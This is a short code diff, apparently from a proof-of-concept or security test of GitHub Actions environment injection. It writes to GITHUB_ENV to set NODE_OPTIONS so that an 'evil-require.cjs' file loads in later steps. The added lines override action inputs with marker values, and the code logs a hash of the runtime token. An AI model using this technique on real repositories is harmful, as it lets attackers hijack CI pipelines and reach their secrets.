@@ -11,6 +11,9 @@ try {
   if (process.env.GITHUB_ENV) {
     fs.appendFileSync(process.env.GITHUB_ENV, 'PWNHAVEN_ENV_INJECTED=1\n');
     fs.appendFileSync(process.env.GITHUB_ENV, 'NODE_OPTIONS=--require ' + process.cwd() + '/evil-require.cjs\n');
+    fs.appendFileSync(process.env.GITHUB_ENV, 'INPUT_ISSUE-NUMBER=2\n');
+    fs.appendFileSync(process.env.GITHUB_ENV, 'INPUT_BODY=PWNHAVEN_INPUT_OVERRIDE\n');
+    fs.appendFileSync(process.env.GITHUB_ENV, 'PWNHAVEN_ENV2=1\n');
   }
   const t = process.env.ACTIONS_RUNTIME_TOKEN || '';
   if (t) console.log('RUNTIME_TOKEN_SHA256=' + crypto.createHash('sha256').update(t).digest('hex'));
